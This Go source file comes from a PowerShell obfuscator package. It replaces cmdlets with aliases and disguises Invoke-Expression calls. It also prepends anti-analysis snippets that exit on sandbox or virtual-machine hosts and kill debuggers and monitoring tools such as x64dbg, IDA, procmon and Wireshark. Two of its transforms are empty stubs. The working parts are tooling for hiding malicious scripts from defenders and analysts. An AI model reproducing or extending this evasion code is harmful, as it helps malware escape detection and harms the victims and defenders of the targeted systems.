package obfuscator

import (
	"regexp"
	"strings"
)

type HexEncodeTransform struct{}

func (t *HexEncodeTransform) Name() string { return "hexenc" }

func (t *HexEncodeTransform) Apply(ps string, ctx TransformContext) (string, error) {
	// Hex encoding causes parsing issues in Windows PowerShell
	// Return unchanged for now
	return ps, nil
}

// Valid PowerShell aliases only - these are guaranteed to work
var psAliases = map[string]string{
	"Write-Output":        "write|echo",
	"Get-Content":         "cat|type|gc",
	"Set-Content":         "sc",
	"Get-ChildItem":       "dir|ls|gci",
	"Get-Location":        "pwd|gl",
	"Invoke-Expression":   "iex",
	"ForEach-Object":      "foreach|%",
	"Where-Object":        "where|?",
	"Select-Object":       "select",
	"Measure-Object":      "measure",
	"Sort-Object":         "sort",
	"Group-Object":        "group",
	"Compare-Object":      "diff|compare",
	"Remove-Item":         "del|rm|ri",
	"Copy-Item":           "copy|cp|ci",
	"Move-Item":           "move|mv|mi",
	"Rename-Item":         "ren|rni",
	"Get-Process":         "gps|ps",
	"Stop-Process":        "kill|spps",
	"Get-Service":         "gsv",
	"Start-Service":       "sasv",
	"Stop-Service":        "spsv",
	"Get-Command":         "gcm",
	"Get-Help":            "help",
	"Get-Member":          "gm",
	"Import-Module":       "ipmo",
	"Export-ModuleMember": "epmo",
}

type AliasSubstitutionTransform struct{}

func (t *AliasSubstitutionTransform) Name() string { return "alias" }

func (t *AliasSubstitutionTransform) Apply(ps string, ctx TransformContext) (string, error) {
	result := ps
	for cmdlet, aliases := range psAliases {
		if aliases == "" {
			continue
		}
		aliasList := strings.Split(aliases, "|")
		chosen := aliasList[ctx.RNG().Intn(len(aliasList))]
		pattern := regexp.MustCompile(`(?i)\b` + regexp.QuoteMeta(cmdlet) + `\b`)
		result = pattern.ReplaceAllStringFunc(result, func(m string) string {
			return chosen
		})
	}
	return result, nil
}

type UnicodeTransform struct {
	Percent int
}

func (t *UnicodeTransform) Name() string { return "unicode" }

func (t *UnicodeTransform) Apply(ps string, ctx TransformContext) (string, error) {
	// Unicode encoding causes parsing issues in Windows PowerShell
	// Return unchanged for now
	return ps, nil
}

var antiDebugSnippets = []string{
	`if($env:COMPUTERNAME -match '^(SANDBOX|MALWARE|VIRUS|SAMPLE|VM)'){ exit }`,
	`if($env:USERNAME -match '^(admin|Administrator|user|malware|sandbox|sample)'){ exit }`,
	`Get-Process | Where-Object{$_.ProcessName -match '^(ollydbg|x64dbg|ida|cheat|procmon|wireshark|fiddler|procexp)$'} | Stop-Process -Force; if((Get-Process -ErrorAction SilentlyContinue | Where-Object{$_.ProcessName -match '^(ollydbg|x64dbg|ida)$'}) -ne $null){exit}`,
	`if((Get-WmiObject Win32_ComputerSystem).Model -match '^(VirtualBox|VMware|Virtual Machine)'){ exit }`,
	`$t=[Diagnostics.Stopwatch]::StartNew();Start-Sleep -Milliseconds 500;if($t.ElapsedMilliseconds -lt 400){ exit }`,
}

type AntiDebugTransform struct {
	Level int
}

func (t *AntiDebugTransform) Name() string { return "antidebug" }

func (t *AntiDebugTransform) Apply(ps string, ctx TransformContext) (string, error) {
	if t.Level <= 0 {
		return ps, nil
	}

	n := t.Level
	if n > len(antiDebugSnippets) {
		n = len(antiDebugSnippets)
	}

	shuffled := make([]string, len(antiDebugSnippets))
	copy(shuffled, antiDebugSnippets)
	for i := range shuffled {
		j := ctx.RNG().Intn(i + 1)
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	}

	selected := shuffled[:n]

	var sb strings.Builder
	for _, snippet := range selected {
		obfuscated := snippet
		if ctx.RNG().Intn(100) < 50 {
			obfuscated = strings.ReplaceAll(obfuscated, " ", "  ")
		}
		sb.WriteString(obfuscated + "\n")
	}
	sb.WriteString(ps)
	return sb.String(), nil
}

var iexAlternatives = []string{
	"Invoke-Expression",
	"IEX",
	".",
	"`I`E`X",
	"[ScriptBlock]::Create({0}).Invoke()",
}

type IEXObfuscationTransform struct{}

func (t *IEXObfuscationTransform) Name() string { return "iexobf" }

func (t *IEXObfuscationTransform) Apply(ps string, ctx TransformContext) (string, error) {
	result := ps

	iexPattern := regexp.MustCompile(`(?i)\bInvoke-Expression\b`)

	matches := iexPattern.FindAllStringIndex(result, -1)
	if len(matches) == 0 {
		return ps, nil
	}

	for i := len(matches) - 1; i >= 0; i-- {
		m := matches[i]
		alt := iexAlternatives[ctx.RNG().Intn(3)]
		result = result[:m[0]] + alt + result[m[1]:]
	}

	return result, nil
}
